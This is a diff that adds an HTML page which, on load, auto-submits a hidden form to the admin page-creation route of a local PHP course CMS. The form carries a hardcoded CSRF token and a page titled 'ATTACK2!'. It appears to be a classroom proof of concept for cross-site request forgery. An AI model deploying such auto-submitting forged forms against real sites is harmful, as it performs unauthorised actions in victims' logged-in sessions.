@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <form method="POST" action="http://localhost/phpcourse/30%20-%20cms/index.php?route=admin/pages/create">
+    <input type="hidden" name="_csrf" value="74ede1867f2b99da79353bc55099ec2b490a8cb6366362d013ac23610c334618" />
+    <input type="hidden" name="title" value="ATTACK2!"/>
+    <input type="hidden" name="slug" value="attack2"/>
+    <input type="hidden" name="content" value="..."/>
+    <input type="submit" id="submit"/>
+  </form>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      document.getElementById('submit').click();
+    })
+  </script>
+</body>
+</html>
